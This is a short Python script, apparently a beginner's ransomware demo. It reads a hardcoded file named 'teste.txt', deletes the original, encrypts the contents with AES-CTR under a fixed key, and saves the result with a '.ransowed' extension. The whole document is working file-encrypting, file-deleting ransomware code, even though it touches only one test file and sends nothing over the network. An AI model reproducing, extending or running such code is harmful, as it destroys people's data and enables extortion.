import os
import pyaes

#opening target file
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

#removing original file
os.remove(file_name)

#encrypting key

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

#encrypting the file
crypto_data = aes.encrypt(file_data)

#saving encrypted file

new_file = file_name + '.ransowed'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()